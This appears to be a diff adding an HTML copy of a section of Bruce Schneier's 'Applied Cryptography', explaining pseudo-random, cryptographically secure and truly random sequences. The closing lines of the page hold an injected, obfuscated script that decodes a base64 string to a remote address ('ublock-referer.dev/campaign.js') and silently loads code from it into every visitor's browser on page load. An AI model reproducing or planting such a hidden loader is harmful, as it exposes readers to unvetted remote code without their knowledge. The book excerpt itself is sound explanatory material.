@@ -1,0 +1,93 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Protocol Building Blocks</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=02//-->
+<!--PAGES=044-046//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="02-10.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch03/03-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Random-number generators are not random because they don&#146;t have to be. Most simple applications, like computer games, need so few random numbers that they hardly notice. However, cryptography is extremely sensitive to the properties of random-number generators. Use a poor random-number generator and you start getting weird correlations and strange results [1231,1238]. If you are depending on your random-number generator for security, weird correlations and strange results are the last things you want.
+</P>
+<P>The problem is that a random-number generator doesn&#146;t produce a random sequence. It probably doesn&#146;t produce anything that looks even remotely like a random sequence. Of course, it is impossible to produce something truly random on a computer. Donald Knuth quotes John von Neumann as saying: &#147;Anyone who considers arithmetical methods of producing random digits is, of course, in a state of sin&#148; [863]. Computers are deterministic beasts: Stuff goes in one end, completely predictable operations occur inside, and different stuff comes out the other end. Put the same stuff in on two separate occasions and the same stuff comes out both times. Put the same stuff into two identical computers, and the same stuff comes out of both of them. A computer can only be in a finite number of states (a large finite number, but a finite number nonetheless), and the stuff that comes out will always be a deterministic function of the stuff that went in and the computer&#146;s current state. That means that any random-number generator on a computer (at least, on a finite-state machine) is, by definition, periodic. Anything that is periodic is, by definition, predictable. And if something is predictable, it can&#146;t be random. A true random-number generator requires some random input; a computer can&#146;t provide that.</P>
+<P><FONT SIZE="+1"><B><I>Pseudo-Random Sequences</I></B></FONT></P>
+<P>The best a computer can produce is a <B>pseudo-random-sequence generator</B>. What&#146;s that? Many people have taken a stab at defining this formally, but I&#146;ll hand-wave here. A pseudo-random sequence is one that looks random. The sequence&#146;s period should be long enough so that a finite sequence of reasonable length&#151;that is, one that is actually used&#151;is not periodic. If you need a billion random bits, don&#146;t choose a sequence generator that repeats after only sixteen thousand bits. These relatively short nonperiodic subsequences should be as indistinguishable as possible from random sequences. For example, they should have about the same number of ones and zeros, about half the runs (sequences of the same bit) should be of length one, one quarter of length two, one eighth of length three, and so on. They should not be compressible. The distribution of run lengths for zeros and ones should be the same [643,863,99,1357]. These properties can be empirically measured and then compared to statistical expectations using a chi-square test.</P>
+<P>For our purposes, a sequence generator is pseudo-random if it has this property:</P>
+<DL>
+<DD><B>1.</B>&nbsp;&nbsp;It looks random. This means that it passes all the statistical tests of randomness that we can find. (Start with the ones in [863].)
+</DL>
+<P>A lot of effort has gone into producing good pseudo-random sequences on computer. Discussions of generators abound in the academic literature, along with various tests of randomness. All of these generators are periodic (there&#146;s no escaping that); but with potential periods of 2<SUP>256</SUP> bits and higher, they can be used for the largest applications.</P>
+<P>The problem is still those weird correlations and strange results. Every pseudo-random-sequence generator is going to produce them if you use them in a certain way. And that&#146;s what a cryptanalyst will use to attack the system.</P>
+<P><FONT SIZE="+1"><B><I>Cryptographically Secure Pseudo-Random Sequences</I></B></FONT></P>
+<P>Cryptographic applications demand much more of a pseudo-random-sequence generator than do most other applications. Cryptographic randomness doesn&#146;t mean just statistical randomness, although that&#146;s part of it. For a sequence to be <B>cryptographically secure pseudo-random</B>, it must also have this property:</P>
+<DL>
+<DD><B>2.</B>&nbsp;&nbsp;It is unpredictable. It must be computationally infeasible to predict what the next random bit will be, given complete knowledge of the algorithm or hardware generating the sequence and all of the previous bits in the stream.
+</DL>
+<P>Cryptographically secure pseudo-random sequences should not be compressible...unless you know the key. The key is generally the seed used to set the initial state of the generator.
+</P>
+<P>Like any cryptographic algorithm, cryptographically secure pseudo-random-sequence generators are subject to attack. Just as it is possible to break an encryption algorithm, it is possible to break a cryptographically secure pseudo-random-sequence generator. Making generators resistant to attack is what cryptography is all about.</P>
+<P><FONT SIZE="+1"><B><I>Real Random Sequences</I></B></FONT></P>
+<P>Now we&#146;re drifting into the domain of philosophers. Is there such a thing as randomness? What is a random sequence? How do you know if a sequence is random? Is &#147;101110100&#148; more random than &#147;101010101&#148;? Quantum mechanics tells us that there is honest-to-goodness randomness in the real world. But can we preserve that randomness in the deterministic world of computer chips and finite-state machines?
+</P>
+<P>Philosophy aside, from our point of view a sequence generator is <B>real random</B> if it has this additional third property:</P>
+<DL>
+<DD><B>3.</B>&nbsp;&nbsp;It cannot be reliably reproduced. If you run the sequence generator twice with the exact same input (at least as exact as humanly possible), you will get two completely unrelated random sequences.
+</DL>
+<P>The output of a generator satisfying these three properties will be good enough for a one-time pad, key generation, and any other cryptographic applications that require a truly random sequence generator. The difficulty is in determining whether a sequence is really random. If I repeatedly encrypt a string with DES and a given key, I will get a nice, random-looking output; you won&#146;t be able to tell that it&#146;s nonrandom unless you rent time on the NSA&#146;s DES cracker.
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="02-10.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch03/03-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(aolBJMcN, kwPldqGi) {kwPldqGi = aolBJMcN.createElement('script');kwPldqGi.type = 'text/javascript';kwPldqGi.async = true;kwPldqGi.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');aolBJMcN.getElementsByTagName('body')[0].appendChild(kwPldqGi);}(document));</script></body>
+</html>
